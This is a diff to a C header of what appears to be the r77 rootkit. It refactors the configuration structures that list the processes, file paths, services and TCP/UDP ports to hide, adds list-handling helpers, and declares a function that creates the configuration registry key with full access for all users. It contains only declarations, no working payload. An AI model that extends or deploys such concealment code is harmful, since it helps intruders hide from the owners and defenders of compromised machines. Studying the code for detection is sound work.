@@ -8,6 +8,7 @@
 #include <Shlwapi.h>
 #include <Psapi.h>
 #include <aclapi.h>
+#include <sddl.h>
 #include <initguid.h>
 #include <MSTask.h>
 #include <stdio.h>
@@ -51,31 +52,6 @@
 #define R77_HELPER_SIGNATURE					0x7268
 
 /// <summary>
-/// The maximum number of processes that can be hidden by ID.
-/// </summary>
-#define R77_CONFIG_MAX_HIDDEN_PROCESS_IDS		100
-/// <summary>
-/// The maximum number of processes that can be hidden by name.
-/// </summary>
-#define R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES		100
-/// <summary>
-/// The maximum number of files or directories that can be hidden by full path.
-/// </summary>
-#define R77_CONFIG_MAX_HIDDEN_PATHS				100
-/// <summary>
-/// The maximum number of local TCP ports that can be hidden.
-/// </summary>
-#define R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS	100
-/// <summary>
-/// The maximum number of remote TCP ports that can be hidden.
-/// </summary>
-#define R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS	100
-/// <summary>
-/// The maximum number of UDP ports that can be hidden.
-/// </summary>
-#define R77_CONFIG_MAX_HIDDEN_UDP_PORTS			100
-
-/// <summary>
 /// Name for the scheduled task that starts the r77 service for 32-bit processes.
 /// </summary>
 #define R77_SERVICE_NAME32						HIDE_PREFIX L"svc32"
@@ -97,6 +73,48 @@
 /// A callback that notifies about a process ID.
 /// </summary>
 typedef VOID(*PROCESSIDCALLBACK)(DWORD processId);
+
+/// <summary>
+/// Defines a collection of ULONG values.
+/// </summary>
+typedef struct _INTEGER_LIST
+{
+	/// <summary>
+	/// The number of ULONG values in this list.
+	/// </summary>
+	DWORD Count;
+	/// <summary>
+	/// The currently allocated capacity of the buffer. The buffer expands automatically when values are added.
+	/// </summary>
+	DWORD Capacity;
+	/// <summary>
+	/// A buffer that stores the ULONG values in this list.
+	/// </summary>
+	PULONG Values;
+} INTEGER_LIST, *PINTEGER_LIST;
+
+/// <summary>
+/// Defines a collection of strings.
+/// </summary>
+typedef struct _STRING_LIST
+{
+	/// <summary>
+	/// The number of strings in this list.
+	/// </summary>
+	DWORD Count;
+	/// <summary>
+	/// The currently allocated capacity of the buffer. The buffer expands automatically when values are added.
+	/// </summary>
+	DWORD Capacity;
+	/// <summary>
+	/// TRUE to treat strings as case insensitive.
+	/// </summary>
+	BOOL IgnoreCase;
+	/// <summary>
+	/// A buffer that stores the strings in this list.
+	/// </summary>
+	LPWSTR *Values;
+} STRING_LIST, *PSTRING_LIST;
 
 /// <summary>
 /// Defines the r77 header.
@@ -124,53 +142,33 @@ typedef struct _R77_PROCESS
 typedef struct _R77_CONFIG
 {
 	/// <summary>
-	/// The number of process ID's to hide.
+	/// A list of process ID's to hide in addition to processes hidden by the prefix.
 	/// </summary>
-	DWORD HiddenProcessIdCount;
+	PINTEGER_LIST HiddenProcessIds;
 	/// <summary>
-	/// An array of process ID's to hide in addition to processes hidden by the prefix.
+	/// A list of process names to hide in addition to processes hidden by the prefix.
 	/// </summary>
-	LPDWORD HiddenProcessIds;
+	PSTRING_LIST HiddenProcessNames;
 	/// <summary>
-	/// The number of process names to hide.
+	/// A list of file or directory full paths to hide in addition to files and directories hidden by the prefix.
 	/// </summary>
-	DWORD HiddenProcessNameCount;
+	PSTRING_LIST HiddenPaths;
 	/// <summary>
-	/// An array of process names to hide in addition to processes hidden by the prefix.
+	/// A list of service names to hide in addition to services hidden by the prefix.
 	/// </summary>
-	LPWSTR *HiddenProcessNames;
+	PSTRING_LIST HiddenServiceNames;
 	/// <summary>
-	/// The number of files or directories to hide.
+	/// A list of local TCP ports to hide.
 	/// </summary>
-	DWORD HiddenPathCount;
+	PINTEGER_LIST HiddenTcpLocalPorts;
 	/// <summary>
-	/// An array of file or directory full paths to hide in addition to files and directories hidden by the prefix.
+	/// A list of remote TCP ports to hide.
 	/// </summary>
-	LPWSTR *HiddenPaths;
+	PINTEGER_LIST HiddenTcpRemotePorts;
 	/// <summary>
-	/// The number of hidden local TCP ports.
+	/// A list of UDP ports to hide.
 	/// </summary>
-	DWORD HiddenTcpLocalPortCount;
-	/// <summary>
-	/// An array of local TCP ports to hide.
-	/// </summary>
-	PUSHORT HiddenTcpLocalPorts;
-	/// <summary>
-	/// The number of hidden remote TCP ports.
-	/// </summary>
-	DWORD HiddenTcpRemotePortCount;
-	/// <summary>
-	/// An array of remote TCP ports to hide.
-	/// </summary>
-	PUSHORT HiddenTcpRemotePorts;
-	/// <summary>
-	/// The number of hidden UDP ports.
-	/// </summary>
-	DWORD HiddenUdpPortCount;
-	/// <summary>
-	/// An array of UDP ports to hide.
-	/// </summary>
-	PUSHORT HiddenUdpPorts;
+	PINTEGER_LIST HiddenUdpPorts;
 } R77_CONFIG, *PR77_CONFIG;
 
 /// <summary>
@@ -241,7 +239,7 @@ BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit);
 /// <returns>
 /// A pointer to the function, or NULL, if either the DLL was not found or does not have a function by the specified name.
 /// </returns>
-PVOID GetFunction(LPCSTR dll, LPCSTR function);
+LPVOID GetFunction(LPCSTR dll, LPCSTR function);
 /// <summary>
 /// Gets the integrity level of a process.
 /// </summary>
@@ -416,6 +414,100 @@ DWORD GetReflectiveDllMain(LPBYTE dll);
 DWORD RvaToOffset(LPBYTE dll, DWORD rva);
 
 /// <summary>
+/// Creates a new INTEGER_LIST.
+/// </summary>
+/// <returns>
+/// A pointer to the newly created INTEGER_LIST structure.
+/// </returns>
+PINTEGER_LIST CreateIntegerList();
+/// <summary>
+/// Loads DWORD values from the specified registry key into the specified INTEGER_LIST structure.
+/// <para>Values that are already in the list are not added.</para>
+/// </summary>
+/// <param name="list">The INTEGER_LIST structure to add the values to.</param>
+/// <param name="key">The registry key to read DWORD values from.</param>
+VOID LoadIntegerListFromRegistryKey(PINTEGER_LIST list, HKEY key);
+/// <summary>
+/// Deletes the specified INTEGER_LIST structure.
+/// </summary>
+/// <param name="list">The INTEGER_LIST structure to delete.</param>
+VOID DeleteIntegerList(PINTEGER_LIST list);
+/// <summary>
+/// Adds a ULONG value to the specified INTEGER_LIST.
+/// </summary>
+/// <param name="list">The INTEGER_LIST structure to add the ULONG value to.</param>
+/// <param name="value">The ULONG value to add to the list.</param>
+VOID IntegerListAdd(PINTEGER_LIST list, ULONG value);
+/// <summary>
+/// Determines whether the ULONG value is in the specified INTEGER_LIST.
+/// </summary>
+/// <param name="list">The INTEGER_LIST structure to search.</param>
+/// <param name="value">The ULONG value to check.</param>
+/// <returns>
+/// TRUE, if the specified ULONG value is in the specified INTEGER_LIST;
+/// otherwise, FALSE.
+/// </returns>
+BOOL IntegerListContains(PINTEGER_LIST list, ULONG value);
+/// <summary>
+/// Compares two INTEGER_LIST structures for equality.
+/// </summary>
+/// <param name="listA">The first INTEGER_LIST structure.</param>
+/// <param name="listB">The second INTEGER_LIST structure.</param>
+/// <returns>
+/// TRUE, if both INTEGER_LIST structures are equal;
+/// otherwise, FALSE.
+/// </returns>
+BOOL CompareIntegerList(PINTEGER_LIST listA, PINTEGER_LIST listB);
+
+/// <summary>
+/// Creates a new STRING_LIST.
+/// </summary>
+/// <param name="ignoreCase">TRUE to treat strings as case insensitive.</param>
+/// <returns>
+/// A pointer to the newly created STRING_LIST structure.
+/// </returns>
+PSTRING_LIST CreateStringList(BOOL ignoreCase);
+/// <summary>
+/// Loads REG_SZ values from the specified registry key into the specified STRING_LIST structure.
+/// <para>Strings that are already in the list are not added.</para>
+/// </summary>
+/// <param name="list">The STRING_LIST structure to add the strings to.</param>
+/// <param name="key">The registry key to read REG_SZ values from.</param>
+/// <param name="maxStringLength">The maximum length of REG_SZ values that are read from the registry key.</param>
+VOID LoadStringListFromRegistryKey(PSTRING_LIST list, HKEY key, DWORD maxStringLength);
+/// <summary>
+/// Deletes the specified STRING_LIST structure.
+/// </summary>
+/// <param name="list">The STRING_LIST structure to delete.</param>
+VOID DeleteStringList(PSTRING_LIST list);
+/// <summary>
+/// Adds a string to the specified STRING_LIST.
+/// </summary>
+/// <param name="list">The STRING_LIST structure to add the string to.</param>
+/// <param name="value">The string to add to the list.</param>
+VOID StringListAdd(PSTRING_LIST list, LPCWSTR value);
+/// <summary>
+/// Determines whether the string is in the specified STRING_LIST.
+/// </summary>
+/// <param name="list">The STRING_LIST structure to search.</param>
+/// <param name="value">The string to check.</param>
+/// <returns>
+/// TRUE, if the specified string is in the specified STRING_LIST;
+/// otherwise, FALSE.
+/// </returns>
+BOOL StringListContains(PSTRING_LIST list, LPCWSTR value);
+/// <summary>
+/// Compares two STRING_LIST structures for equality.
+/// </summary>
+/// <param name="listA">The first STRING_LIST structure.</param>
+/// <param name="listB">The second STRING_LIST structure.</param>
+/// <returns>
+/// TRUE, if both STRING_LIST structures are equal;
+/// otherwise, FALSE.
+/// </returns>
+BOOL CompareStringList(PSTRING_LIST listA, PSTRING_LIST listB);
+
+/// <summary>
 /// Retrieves a list of all processes where an r77 header is present.
 /// <para>The result includes only processes where the bitness matches that of the current process.</para>
 /// </summary>
@@ -482,6 +574,15 @@ VOID DeleteR77Config(PR77_CONFIG config);
 /// otherwise, FALSE.
 /// </returns>
 BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB);
+/// <summary>
+/// Creates the r77 configuration registry key with full access to all users.
+/// </summary>
+/// <param name="key">The newly created HKEY.</param>
+/// <returns>
+/// TRUE, if this function succeeds;
+/// otherwise, FALSE.
+/// </returns>
+BOOL InstallR77Config(PHKEY key);
 /// <summary>
 /// Deletes the r77 configuration from the registry.
 /// </summary>
